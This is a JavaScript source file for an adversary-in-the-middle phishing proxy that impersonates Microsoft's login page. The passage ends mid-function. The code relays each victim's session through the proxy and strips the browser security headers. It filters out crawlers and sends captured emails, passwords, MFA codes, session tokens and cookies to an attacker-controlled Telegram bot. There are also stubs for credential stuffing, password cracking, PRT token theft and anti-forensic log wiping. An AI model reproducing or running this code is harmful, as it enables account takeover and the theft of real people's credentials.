const http = require("http");
const https = require("https");
const path = require("path");
const fs = require("fs");
const zlib = require("zlib");
const crypto = require("crypto");
const os = require("os");

let axios, AdmZip, WebSocket, FormData, puppeteer;
try { axios = require('axios'); } catch (e) { axios = null; }
try { AdmZip = require('adm-zip'); } catch (e) { AdmZip = null; }
try { WebSocket = require('ws'); } catch (e) { WebSocket = null; }
try { FormData = require('form-data'); } catch (e) { FormData = null; }
try { puppeteer = require('puppeteer'); } catch (e) { puppeteer = null; }

const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || '';
const DASHBOARD_USER = process.env.DASHBOARD_USER || '';
const DASHBOARD_PASS = process.env.DASHBOARD_PASS || '';

const PROXY_ENTRY_POINT = "/auth?provider=azure&client=3ce82761-cb43-493f-94bb-fe444b7a0cc4";
const PHISHED_URL_PARAMETER = "dest";
const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
const REDIRECT_URL = "https://login.microsoftonline.com/";

const PROXY_FILES = {
    index: "index_967dba6f43dc7a6b.html",
    notFound: "404_8a9fc57107a2d526.html",
    script: "app_ec7ea3fea392536c.js"
};

const PROXY_PATHNAMES = {
    proxy: "/gateway/a5001019e1a7b99f9604",
    serviceWorker: "/sw_257d3c475e1e56ec.js",
    script: "/_",
    mutation: "/track/8be84090a1c8794aec3a",
    jsCookie: "/sync/92346b1c8a8a5a182160",
    favicon: "/favicon.ico"
};

const LOGS_DIRECTORY = path.join(__dirname, "phishing_logs");
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
const VISITS_LOG_DIR = path.join(__dirname, "visit_logs");
const VISITS_LOG_FILE = path.join(VISITS_LOG_DIR, "visits.log");
const DEVICE_FLOWS_FILE = path.join(__dirname, "device_flows.json");
const PRT_STORAGE_FILE = path.join(__dirname, "prt_storage.json");
const RULES_FILE = path.join(__dirname, "rules.json");
const PLUGINS_DIR = path.join(__dirname, "plugins");
const CRYPTO_CONFIG_FILE = path.join(__dirname, "crypto_config.json");
const MAIL_RULES_FILE = path.join(__dirname, "mail_rules.json");

if (!fs.existsSync(LOGS_DIRECTORY)) fs.mkdirSync(LOGS_DIRECTORY, { recursive: true });
if (!fs.existsSync(VISITS_LOG_DIR)) fs.mkdirSync(VISITS_LOG_DIR, { recursive: true });
if (!fs.existsSync(PLUGINS_DIR)) fs.mkdirSync(PLUGINS_DIR, { recursive: true });

const LOG_FILE_STREAMS = {};
const VICTIM_SESSIONS = {};
let deviceFlows = [];
let prtStorage = { prts: [], lastScan: null };
const SESSION_TTL = 3600000;
const MAX_OPEN_STREAMS = 100;

// --- Helper to load/save JSON files ---
function loadJSON(file, defaultVal = {}) {
    try {
        if (fs.existsSync(file)) return JSON.parse(fs.readFileSync(file, 'utf-8'));
    } catch(e) {}
    return defaultVal;
}
function saveJSON(file, data) {
    fs.writeFileSync(file, JSON.stringify(data, null, 2));
}

// --- Rule helpers ---
function loadRules() { return loadJSON(RULES_FILE, []); }
function saveRules(rules) { saveJSON(RULES_FILE, rules); }

// --- Mail rule helpers ---
function loadMailRules() { return loadJSON(MAIL_RULES_FILE, []); }
function saveMailRules(rules) { saveJSON(MAIL_RULES_FILE, rules); }

// --- Crypto config helpers ---
function loadCryptoConfig() { return loadJSON(CRYPTO_CONFIG_FILE, { enabled: false, targets: [] }); }
function saveCryptoConfig(config) { saveJSON(CRYPTO_CONFIG_FILE, config); }

// --- OPSEC settings (stored in memory for simplicity) ---
let opsecSettings = { tor: false, ipRotInterval: 5, logRetention: 30, encryptLogs: true };

// --- Plugin system ---
function loadPluginsFromDisk() {
    const plugins = [];
    if (fs.existsSync(PLUGINS_DIR)) {
        const files = fs.readdirSync(PLUGINS_DIR);
        for (const f of files) {
            if (f.endsWith('.js')) {
                const name = path.basename(f, '.js');
                plugins.push({ id: name, name: name, enabled: true });
            }
        }
    }
    return plugins;
}

// --- AI stub functions ---
function runAIAnalysis(data) {
    // Placeholder: implement actual AI logic (password strength, anomaly, HIBP, etc.)
    return data.map(item => ({
        ...item,
        strength: 'Strong',
        anomaly: 'Normal',
        hibp: 'Clean',
        score: 95,
        plaintext: null // would be cracked password
    }));
}
async function checkHIBP(email) {
    // Real implementation would call HIBP API
    return { email, found: false };
}
async function crackHash(hash) {
    // Placeholder: attempt cracking with John/Hashcat or external service
    return { hash, cracked: false, plaintext: null };
}
async function scanOCR(attachmentPath) {
    // Placeholder: use Tesseract
    return { text: 'Extracted text' };
}
function generateSuggestions(rules, pastData) {
    // Simple ML stub: suggest rules based on frequency
    const suggestions = [];
    if (pastData && pastData.length) {
        suggestions.push({
            id: 'suggest_1',
            name: 'Auto-exchange refresh tokens',
            trigger: 'new_refresh_token',
            action: 'exchange_token',
            payload: {}
        });
    }
    return suggestions;
}

// --- Integration stubs ---
async function shodanLookup(ip) {
    // Call Shodan API
    return { ip, ports: [80, 443], services: ['http', 'https'] };
}
async function vtLookup(hash) {
    // Call VirusTotal API
    return { hash, positives: 0, total: 60 };
}

// --- OPSEC stubs ---
function applyOPSEC(tor, ipRotInterval) {
    opsecSettings.tor = tor;
    opsecSettings.ipRotInterval = ipRotInterval;
    // In a real implementation, restart proxy with Tor, rotate IP, etc.
}
function wipeOldLogs() {
    const retention = opsecSettings.logRetention;
    const cutoff = Date.now() - retention * 86400000;
    const files = fs.readdirSync(LOGS_DIRECTORY);
    for (const f of files) {
        const p = path.join(LOGS_DIRECTORY, f);
        if (fs.statSync(p).mtime < cutoff) fs.unlinkSync(p);
    }
}

// --- Replay scheduler (use setInterval) ---
let scheduledReplays = [];
function scheduleReplay(filename, interval) {
    // Store the schedule; in real implementation, use a cron library.
    const id = Date.now();
    scheduledReplays.push({ id, filename, interval, timer: null });
    startScheduledReplay(id);
}
function startScheduledReplay(id) {
    const entry = scheduledReplays.find(e => e.id === id);
    if (!entry) return;
    entry.timer = setInterval(() => {
        // Trigger headless replay
        headlessReplay(entry.filename).catch(e => console.error('Scheduled replay failed:', e));
    }, entry.interval * 60000);
}
async function headlessReplay(filename) {
    if (!puppeteer) return;
    // Actual headless logic
    const browser = await puppeteer.launch({ headless: 'new' });
    const page = await browser.newPage();
    // In practice, navigate to proxy entry point, inject cookies, etc.
    await browser.close();
}

// --- Credential stuffing stub ---
async function tryCredentialStuffing(tokenId) {
    // Placeholder: test credentials against common services
    return { tokenId, results: [{ service: 'google', success: false }, { service: 'facebook', success: false }] };
}

// --- Campaign helpers ---
function generateTrackingPixel() {
    return `/pixel/${crypto.randomBytes(16).toString('hex')}`;
}
function createABTest(name, domain, variantA, variantB) {
    // Store campaign in a file
    return crypto.randomBytes(8).toString('hex');
}

// ---- Existing classes (CacheManager, RateLimiter, TokenVault, GraphClient) ----
class CacheManager {
    constructor(ttl = 300000) {
        this.cache = new Map();
        this.ttl = ttl;
        this.hits = 0;
        this.misses = 0;
    }
    get(key) {
        const item = this.cache.get(key);
        if (!item) { this.misses++; return null; }
        if (Date.now() > item.expiry) { this.cache.delete(key); this.misses++; return null; }
        this.hits++; return item.value;
    }
    set(key, value, ttl = null) {
        const expiry = Date.now() + (ttl || this.ttl);
        this.cache.set(key, { value, expiry });
        return value;
    }
    clean() {
        const now = Date.now();
        for (const [key, item] of this.cache) {
            if (now > item.expiry) this.cache.delete(key);
        }
    }
}
global._cache = new CacheManager(300000);

async function retry(fn, retries = 3, delay = 1000, backoff = 2) {
    let lastError, currentDelay = delay;
    for (let attempt = 1; attempt <= retries; attempt++) {
        try { return await fn(); } catch (error) {
            lastError = error;
            if (attempt === retries) break;
            await new Promise(resolve => setTimeout(resolve, currentDelay * (0.85 + Math.random() * 0.3)));
            currentDelay *= backoff;
        }
    }
    throw lastError;
}

class RateLimiter {
    constructor(ratePerSec = 10, burst = 30) {
        this.tokens = new Map();
        this.rate = ratePerSec / 1000;
        this.burst = burst;
    }
    check(ip) {
        const now = Date.now();
        if (!this.tokens.has(ip)) {
            this.tokens.set(ip, { tokens: this.burst, last: now });
            return true;
        }
        const entry = this.tokens.get(ip);
        const elapsed = now - entry.last;
        entry.tokens = Math.min(this.burst, entry.tokens + elapsed * this.rate);
        entry.last = now;
        if (entry.tokens >= 1) {
            entry.tokens -= 1;
            return true;
        }
        return false;
    }
    clean() {
        const now = Date.now();
        for (const [ip, entry] of this.tokens) {
            if (now - entry.last > 60000) this.tokens.delete(ip);
        }
    }
}
const rateLimiter = new RateLimiter(10, 30);
setInterval(() => rateLimiter.clean(), 60000);

const USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
];
function getRandomUserAgent() { return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)]; }
function getAxiosConfig() { return { timeout: 10000, headers: { 'User-Agent': getRandomUserAgent() } }; }

function isBot(userAgent) {
    if (!userAgent) return true;
    const ua = userAgent.toLowerCase();
    if (ua.includes('chrome') || ua.includes('firefox') || ua.includes('safari') || ua.includes('edge') || ua.includes('opera')) {
        return false;
    }
    const botPatterns = ['googlebot','bingbot','slurp','duckduckbot','baiduspider','yandexbot','facebookexternalhit','twitterbot','linkedinbot','telegrambot','discordbot','slackbot','whatsapp','curl','wget','python-requests','go-http-client','java','http-client','scrapy','crawler','spider','bot','crawl','scrape'];
    return botPatterns.some(pattern => ua.includes(pattern));
}

function escapeMarkdown(text) {
    if (!text) return '';
    const specialChars = ['_', '*', '[', ']', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    let escaped = text;
    for (const char of specialChars) escaped = escaped.replaceAll(char, `\\${char}`);
    return escaped;
}

const countryCache = new Map();
const COUNTRY_CACHE_TTL = 3600000;
let geoCircuitOpen = false, geoFailures = 0;
const GEO_FAILURE_THRESHOLD = 5, GEO_RESET_TIMEOUT = 60000;

async function getCountryInfo(ip) {
    if (!ip || ip === 'Unknown' || ip === '::1' || ip === '127.0.0.1') return { code: 'XX', flag: '🌍', name: 'Local' };
    const cached = countryCache.get(ip);
    if (cached && Date.now() < cached.expiry) return cached.data;
    if (geoCircuitOpen) return { code: 'UN', flag: '🌍', name: 'Unknown' };
    try {
        const response = await axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 });
        if (response.data && response.data.country_code) {
            const flag = String.fromCodePoint(...[...response.data.country_code].map(c => 0x1F1E6 + c.charCodeAt(0) - 65));
            const result = { code: response.data.country_code, flag, name: response.data.country_name || response.data.country_code };
            countryCache.set(ip, { data: result, expiry: Date.now() + COUNTRY_CACHE_TTL });
            geoFailures = 0; geoCircuitOpen = false;
            return result;
        }
    } catch (e) {
        geoFailures++;
        if (geoFailures >= GEO_FAILURE_THRESHOLD) {
            geoCircuitOpen = true;
            setTimeout(() => { geoCircuitOpen = false; geoFailures = 0; }, GEO_RESET_TIMEOUT);
        }
    }
    return { code: 'UN', flag: '🌍', name: 'Unknown' };
}

function logVisit(req, pageType = 'page') {
    try {
        const ip = req.headers['cf-connecting-ip'] || req.headers['x-real-ip'] || req.headers['x-forwarded-for']?.split(',')[0]?.trim() || 'Unknown';
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const referer = req.headers['referer'] || req.headers['referrer'] || 'Direct';
        const url = req.url || '/';
        const visitEntry = { timestamp: new Date().toISOString(), ip, userAgent, referer, url, pageType, countryCode: 'UN' };
        if (axios && ip !== 'Unknown') {
            axios.get(`https://ipapi.co/${ip}/json/`, { timeout: 3000 })
                .then(res => {
                    if (res.data?.country_code) {
                        visitEntry.countryCode = res.data.country_code;
                        fs.appendFileSync(VISITS_LOG_FILE, JSON.stringify({ ...visitEntry, countryCode: res.data.country_code }) + '\n');
                    }
                })
                .catch(() => fs.appendFileSync(VISITS_LOG_FILE, JSON.stringify(visitEntry) + '\n'));
        } else {
            fs.appendFileSync(VISITS_LOG_FILE, JSON.stringify(visitEntry) + '\n');
        }
        console.log(`👁️ Visit logged: ${pageType} | IP: ${ip} | URL: ${url}`);
    } catch (e) { console.error('Visit log error:', e.message); }
}

function cleanupSessions() {
    const now = Date.now();
    for (const [sessionId, session] of Object.entries(VICTIM_SESSIONS)) {
        if (session.lastSeen && (now - session.lastSeen) > SESSION_TTL) {
            if (LOG_FILE_STREAMS[sessionId]) {
                try { LOG_FILE_STREAMS[sessionId].end(); } catch(e) {}
                delete LOG_FILE_STREAMS[sessionId];
            }
            delete VICTIM_SESSIONS[sessionId];
            console.log(`🧹 Session ${sessionId} expired.`);
        }
    }
    const streamKeys = Object.keys(LOG_FILE_STREAMS);
    if (streamKeys.length > MAX_OPEN_STREAMS) {
        const toClose = streamKeys.slice(MAX_OPEN_STREAMS);
        for (const key of toClose) {
            try { LOG_FILE_STREAMS[key].end(); } catch(e) {}
            delete LOG_FILE_STREAMS[key];
        }
    }
}
setInterval(cleanupSessions, 60000);

function addCORSHeaders(headers) {
    headers['Access-Control-Allow-Origin'] = '*';
    headers['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
    headers['Access-Control-Allow-Headers'] = 'Content-Type, Authorization, X-Requested-With, Accept, Origin';
    headers['Access-Control-Allow-Credentials'] = 'true';
    return headers;
}

// ── Telegram functions (unchanged) ──
async function sendTokensFile(tokens, sessionId, email, password, mfaCode) {
    const validTokens = Object.fromEntries(Object.entries(tokens).filter(([_, v]) => v && typeof v === 'string'));
    if (Object.keys(validTokens).length === 0 || !FormData) return;
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `tokens_${sessionId}_${timestamp}.txt`;
        const filePath = path.join(os.tmpdir(), filename);
        let content = '# 🔑 FULL TOKENS DUMP\n';
        content += `# Session: ${sessionId}\n# Time: ${new Date().toISOString()}\n# Email: ${email || 'N/A'}\n# Password: ${password || 'N/A'}\n# MFA: ${mfaCode || 'N/A'}\n\n`;
        for (const [key, val] of Object.entries(validTokens)) if (val) content += `${key.toUpperCase()}:\n${val}\n\n`;
        fs.writeFileSync(filePath, content);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename });
        form.append('caption', `🔑 Tokens file: ${filename}`);
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, { headers: form.getHeaders(), timeout: 10000 });
        try { fs.unlinkSync(filePath); } catch(e) {}
        console.log(`📤 Tokens file sent to Telegram for session ${sessionId}`);
    } catch (e) { console.error('Telegram tokens file failed:', e.message); }
}

async function sendCookiesFile(cookies, sessionId) {
    if (!cookies || Object.keys(cookies).length === 0 || !FormData) return;
    try {
        const timestamp = new Date().toISOString().replace(/[:.]/g, '-');
        const filename = `cookies_${sessionId}_${timestamp}.txt`;
        const filePath = path.join(os.tmpdir(), filename);
        let content = '# 🍪 COOKIES DUMP\n';
        for (const [name, value] of Object.entries(cookies)) if (value) content += `${name}=${value}\n`;
        fs.writeFileSync(filePath, content);
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('document', fs.createReadStream(filePath), { filename });
        form.append('caption', `🍪 Cookies: ${filename}`);
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, form, { headers: form.getHeaders(), timeout: 10000 });
        try { fs.unlinkSync(filePath); } catch(e) {}
        console.log(`🍪 Cookies file sent to Telegram for session ${sessionId}`);
    } catch (e) { console.error('Telegram cookies file failed:', e.message); }
}

async function sendToTelegram(data, type = 'capture', ip = null, options = {}) {
    if (!axios) throw new Error('axios not available');
    const { skipFile = false } = options;
    try {
        const sessionId = data.sessionId || 'unknown';
        const email = data.email || 'N/A';
        const password = data.password || 'N/A';
        const mfa = data.mfa || 'N/A';
        const tokens = data.tokens || {};
        const cookies = data.cookies || {};
        const phishedUrl = data.phishedUrl || 'N/A';

        let countryInfo = { flag: '🌍', code: 'UN', name: 'Unknown' };
        if (ip) countryInfo = await getCountryInfo(ip);

        let header;
        switch (type) {
            case 'aitm': header = '🔐 **AiTM Credential Capture!**'; break;
            case 'device': header = '📱 **Device Code Token Capture!**'; break;
            case 'prt': header = '🔄 **PRT Token Exchange!**'; break;
            case 'visit': header = '🌐 **Victim Visit!**'; break;
            default: header = '🔐 **LOGIN CAPTURED!**';
        }

        let message = `${header}\n\n${countryInfo.flag} **${escapeMarkdown(countryInfo.name)}** (${countryInfo.code})\n👤 Email: ${escapeMarkdown(email)}\n🔐 Password: ${escapeMarkdown(password)}\n📱 MFA: ${escapeMarkdown(mfa)}\n🆔 Session: ${escapeMarkdown(sessionId)}\n🕒 Time: ${new Date().toISOString()}`;
        if (type === 'aitm' && phishedUrl !== 'N/A') message += `\n🎯 Target URL: ${escapeMarkdown(phishedUrl)}`;
        if (Object.keys(tokens).length > 0) {
            message += '\n\n🔑 Tokens:\n';
            for (const [k, v] of Object.entries(tokens)) {
                if (v && typeof v === 'string') message += `${escapeMarkdown(k)}: ${escapeMarkdown(v.slice(0, 30))}...\n`;
                else message += `${escapeMarkdown(k)}: (not available)\n`;
            }
            const validTokens = Object.fromEntries(Object.entries(tokens).filter(([_, v]) => v && typeof v === 'string'));
            if (Object.keys(validTokens).length > 0 && !skipFile) await sendTokensFile(validTokens, sessionId, email, password, mfa);
        }
        if (Object.keys(cookies).length > 0) {
            message += '\n🍪 Cookies:\n';
            for (const [k, v] of Object.entries(cookies)) {
                if (v && typeof v === 'string') message += `${escapeMarkdown(k)}: ${escapeMarkdown(v.slice(0, 30))}...\n`;
                else message += `${escapeMarkdown(k)}: (not available)\n`;
            }
            const validCookies = Object.fromEntries(Object.entries(cookies).filter(([_, v]) => v && typeof v === 'string'));
            if (Object.keys(validCookies).length > 0 && !skipFile) await sendCookiesFile(validCookies, sessionId);
        }

        try {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown',
                disable_web_page_preview: true
            }, { timeout: 5000 });
        } catch (markdownError) {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: message,
                disable_web_page_preview: true
            }, { timeout: 5000 });
        }
    } catch (e) { console.error(`❌ Telegram send failed:`, e.message); throw e; }
}

async function sendVisitNotification(req, sessionId, ip) {
    try {
        const userAgent = req.headers['user-agent'] || 'Unknown';
        const url = req.url || '/';
        const countryInfo = await getCountryInfo(ip);
        const message = `${countryInfo.flag} **🌐 Victim Visit!**\n\n🌍 IP: ${ip} (${countryInfo.code})\n🕒 Time: ${new Date().toISOString()}\n🔗 URL: ${escapeMarkdown(url)}\n🖥️ User-Agent: ${escapeMarkdown(userAgent)}\n🆔 Session: ${escapeMarkdown(sessionId)}`;
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            chat_id: CHAT_ID,
            text: message,
            parse_mode: 'Markdown',
            disable_web_page_preview: true
        }, { timeout: 5000 });
        console.log(`✅ Visit notification sent for session ${sessionId}`);
    } catch (e) { console.error(`❌ Visit notification failed:`, e.message); }
}

// ── Proxy helpers (unchanged) ──
function getUserSession(requestCookies) {
    if (!requestCookies) return;
    const cookies = requestCookies.split("; ");
    for (const cookie of cookies) {
        const [name, ...val] = cookie.split("=");
        if (VICTIM_SESSIONS[name] && VICTIM_SESSIONS[name].value === val.join("=")) return name;
    }
    return;
}

function generateRandomString(length) {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join("");
}

function createSessionLogFile(logFilename, currentSession) {
    if (LOG_FILE_STREAMS[currentSession]) {
        try { LOG_FILE_STREAMS[currentSession].end(); } catch(e) {}
        delete LOG_FILE_STREAMS[currentSession];
    }
    const logFilePath = path.join(LOGS_DIRECTORY, logFilename);
    const logFileStream = fs.createWriteStream(logFilePath, { flags: "a" });
    LOG_FILE_STREAMS[currentSession] = logFileStream;
}

function generateNewSession(phishedURL) {
    const cookieName = generateRandomString(12);
    const cookieValue = generateRandomString(32);
    VICTIM_SESSIONS[cookieName] = {
        value: cookieValue,
        cookies: [],
        protocol: phishedURL.protocol,
        hostname: phishedURL.hostname,
        path: phishedURL.pathname + phishedURL.search,
        port: phishedURL.port || (phishedURL.protocol === 'https:' ? 443 : 80),
        host: phishedURL.host,
        logFilename: `${phishedURL.host}__${new Date().toISOString()}.log`,
        lastSeen: Date.now(),
        _lastNotified: {},
        _visitNotified: false
    };
    createSessionLogFile(VICTIM_SESSIONS[cookieName].logFilename, cookieName);
    return { cookieName, cookieValue };
}

function displayError(message, error, ...args) {
    console.error("******************************");
    console.error(`${message}: ${error.name || error}`);
    console.error(`Message: ${error.message}`);
    for (let i = 0; i < args.length; i++) console.error(`Parameter ${i + 1}: ${args[i]}`);
    console.error("******************************");
}

async function encryptData(data) {
    const iv = crypto.randomBytes(16);
    return new Promise((resolve, reject) => {
        const cipher = crypto.createCipheriv("aes-256-ctr", ENCRYPTION_KEY, iv);
        const encryptedData = [];
        cipher.on("error", reject)
              .on("data", chunk => encryptedData.push(chunk))
              .on("end", () => resolve({ iv: iv.toString("hex"), encryptedData: Buffer.concat(encryptedData).toString("hex") }));
        cipher.write(data, "utf-8");
        cipher.end();
    });
}

async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions, proxyRequestBody, proxyResponse, currentSession) {
    const transaction = {
        timestamp: new Date().toISOString(),
        proxyRequestURL: `${proxyRequestProtocol}//${proxyRequestOptions.headers.host}${proxyRequestOptions.path}`,
        proxyRequestMethod: proxyRequestOptions.method,
        proxyRequestHeaders: proxyRequestOptions.headers,
        proxyRequestBody: proxyRequestBody,
        proxyResponseStatusCode: proxyResponse.statusCode,
        proxyResponseHeaders: proxyResponse.headers
    };
    const logFileStream = LOG_FILE_STREAMS[currentSession];
    if (!logFileStream) return;
    const encrypted = await encryptData(JSON.stringify(transaction));
    if (!logFileStream.write(`${JSON.stringify({ [encrypted.iv]: encrypted.encryptedData })}\n`)) {
        await new Promise(resolve => logFileStream.once("drain", resolve));
    }
}

function domainMatches(hostname, cookieDomain) {
    let domain = cookieDomain;
    let hostOnly = false;
    if (domain.startsWith('.')) {
        domain = domain.substring(1);
    } else {
        hostOnly = true;
    }
    if (hostOnly) return hostname === domain;
    if (hostname === domain) return true;
    return hostname.endsWith('.' + domain);
}

function pathMatches(requestPath, cookiePath) {
    if (cookiePath === "/") return true;
    if (requestPath === cookiePath) return true;
    if (requestPath.startsWith(cookiePath + '/')) return true;
    return false;
}

function isCookieApplicable(requestOptions, cookie) {
    return domainMatches(requestOptions.hostname, cookie.domain) &&
           pathMatches(requestOptions.path, cookie.path);
}

function prepareProxyRequestCookies(proxyRequestOptions, currentSession) {
    const cookieMap = {};
    const now = Date.now();
    const session = VICTIM_SESSIONS[currentSession];
    if (!session) return '';
    for (const cookie of session.cookies) {
        if (!(now > cookie.expires) && isCookieApplicable(proxyRequestOptions, cookie)) {
            cookieMap[cookie.name] = cookie.value;
        }
    }
    return Object.entries(cookieMap).map(([n, v]) => `${n}=${v}`).join("; ");
}

function parseCookieDate(cookieDate) {
    let foundTime = false, foundDay = false, foundMonth = false, foundYear = false;
    let h, m, s, day, month, year;
    const tokens = cookieDate.split(/[\x09\x20-\x2F\x3B-\x40\x5B-\x60\x7B-\x7E]+/).filter(t => t);
    for (const token of tokens) {
        if (!foundTime) {
            const tm = /^(\d{1,2}):(\d{1,2}):(\d{1,2})/.exec(token);
            if (tm) { foundTime = true; h = parseInt(tm[1]); m = parseInt(tm[2]); s = parseInt(tm[3]); continue; }
        }
        if (!foundDay) {
            const dm = /^(\d{1,2})(?:[^\d]|$)/.exec(token);
            if (dm) { foundDay = true; day = parseInt(dm[1]); continue; }
        }
        if (!foundMonth) {
            const months = ["jan","feb","mar","apr","may","jun","jul","aug","sep","oct","nov","dec"];
            for (let i = 0; i < months.length; i++) {
                if (token.toLowerCase().startsWith(months[i])) { foundMonth = true; month = i; break; }
            }
            if (foundMonth) continue;
        }
        if (!foundYear) {
            const ym = /^(\d{2,4})(?:[^\d]|$)/.exec(token);
            if (ym) { foundYear = true; year = parseInt(ym[1]); continue; }
        }
    }
    if (year >= 70 && year <= 99) year += 1900; else if (year >= 0 && year <= 69) year += 2000;
    if (!foundDay || !foundMonth || !foundYear || !foundTime) return NaN;
    if (day < 1 || day > 31 || year < 1601 || h > 23 || m > 59 || s > 59) return NaN;
    const d = new Date(Date.UTC(year, month, day, h, m, s));
    if (d.getUTCFullYear() !== year || d.getUTCMonth() !== month || d.getUTCDate() !== day) return NaN;
    return d.getTime();
}

function updateCurrentSessionCookies(request, newCookies, proxyHostname, currentSession, proxyResponseDate = null) {
    const pathNameMatch = request.path.match(/^\/[^?#]*(?=\/)/);
    const now = Date.now();
    let clockSkew = 0;
    if (proxyResponseDate) clockSkew = now - parseCookieDate(proxyResponseDate);
    const session = VICTIM_SESSIONS[currentSession];
    if (!session) return;

    for (const newCookie of newCookies) {
        const [cookie, ...attrs] = newCookie.split(";");
        const [cookieName, ...cookieVal] = cookie.split("=");
        let cookieDomain = request.hostname;
        let cookiePath = (pathNameMatch || ["/"])[0];
        let cookieExpires = NaN, cookieMaxAge = "", cookieHostOnly = true, isValid = true;
        for (const attr of attrs) {
            const a = attr.trim();
            const dm = a.match(/^domain\s*=(.*)$/i);
            const pm = a.match(/^path\s*=(.*)$/i);
            const em = a.match(/^expires\s*=(.*)$/i);
            const mm = a.match(/^max-age\s*=(.*)$/i);
            if (a.toLowerCase() === "domain") { cookieDomain = request.hostname; cookieHostOnly = true; isValid = true; }
            else if (a.toLowerCase() === "path") { cookiePath = (pathNameMatch || ["/"])[0]; }
            else if (a.toLowerCase() === "expires") { cookieExpires = NaN; }
            else if (a.toLowerCase() === "max-age") { cookieMaxAge = ""; }
            else if (dm) {
                let domain = dm[1].replace(/^\./, "").trim();
                if (!domain) {
                    cookieDomain = request.hostname;
                } else {
                    if (domain === request.hostname || request.hostname.endsWith('.' + domain)) {
                        cookieDomain = domain;
                        cookieHostOnly = false;
                    } else {
                        isValid = false;
                        break;
                    }
                }
            } else if (pm) {
                cookiePath = pm[1].trim();
                if (!cookiePath.startsWith("/")) cookiePath = (pathNameMatch || ["/"])[0];
            } else if (em) {
                cookieExpires = parseCookieDate(em[1].trim());
            } else if (mm) {
                cookieMaxAge = mm[1].trim();
                if (!/^-?\d+$/.test(cookieMaxAge)) cookieMaxAge = "";
            }
        }
        if (!isValid) continue;
        cookieExpires += clockSkew;
        if (cookieMaxAge) { const sec = parseInt(cookieMaxAge); if (!isNaN(sec)) cookieExpires = now + sec * 1000; }
        let isNew = true;
        const sessionCookies = session.cookies;
        for (let i = 0; i < sessionCookies.length; i++) {
            const sc = sessionCookies[i];
            if (sc.name === cookieName && sc.domain === cookieDomain && sc.path === cookiePath && sc.hostOnly === cookieHostOnly) {
                if (now > cookieExpires) { sessionCookies.splice(i, 1); break; }
                sc.value = cookieVal.join("="); sc.expires = cookieExpires; isNew = false; break;
            }
        }
        if (isNew && !(now > cookieExpires)) {
            sessionCookies.push({ name: cookieName, value: cookieVal.join("="), domain: cookieDomain, path: cookiePath, expires: cookieExpires, hostOnly: cookieHostOnly });
        }
    }
}

function getValidDomains(domains) {
    const valid = [];
    for (const domain of domains) {
        const parts = domain.split(".");
        for (let i = 2; i < parts.length + 1; i++) {
            const d = parts.slice(-i).join(".");
            if (!valid.includes(d)) valid.push(d);
        }
    }
    return valid;
}

function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHostname) {
    const azureHeaders = ["max-forwards","x-arr-log-id","client-ip","disguised-host","x-site-deployment-id",
        "was-default-hostname","x-forwarded-proto","x-appservice-proto","x-arr-ssl","x-forwarded-tlsversion",
        "x-forwarded-for","x-original-url","x-waws-unencoded-url","x-client-ip","x-client-port"];
    const cookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession);
    if (cookies) proxyRequestOptions.headers.cookie = cookies;
    else delete proxyRequestOptions.headers.cookie;
    if (proxyRequestOptions.headers.origin) {
        proxyRequestOptions.headers.origin = `${VICTIM_SESSIONS[currentSession].protocol}//${VICTIM_SESSIONS[currentSession].host}`;
    }
    if (proxyRequestOptions.headers.referer && proxyRequestOptions.headers.referer.includes(PROXY_ENTRY_POINT)) {
        delete proxyRequestOptions.headers.referer;
    }
    for (const [key, value] of Object.entries(proxyRequestOptions.headers)) {
        if (azureHeaders.includes(key)) delete proxyRequestOptions.headers[key];
        else proxyRequestOptions.headers[key] = value.replaceAll(proxyHostname, VICTIM_SESSIONS[currentSession].host);
    }
    delete proxyRequestOptions.headers[':method'];
    delete proxyRequestOptions.headers[':path'];
    delete proxyRequestOptions.headers[':authority'];
    delete proxyRequestOptions.headers[':scheme'];
}

function deleteHTTPSecurityResponseHeaders(headers) {
    const secHeaders = ["x-frame-options","x-xss-protection","x-content-type-options","set-cookie",
        "content-security-policy","content-security-policy-report-only","cross-origin-opener-policy",
        "cross-origin-embedder-policy","cross-origin-resource-policy","permissions-policy","service-worker-allowed"];
    for (const h of secHeaders) delete headers[h];
}

// ── Compression ──
function decompressData(data, encoding) {
    const map = { gzip: zlib.gunzip, "x-gzip": zlib.gunzip, deflate: zlib.inflate, br: zlib.brotliDecompress, zstd: zlib.zstdDecompress };
    return new Promise((resolve, reject) => {
        const fn = map[encoding];
        if (fn) fn(data, (err, out) => err ? reject(err) : resolve(out));
        else resolve(data);
    });
}

function compressData(data, encoding) {
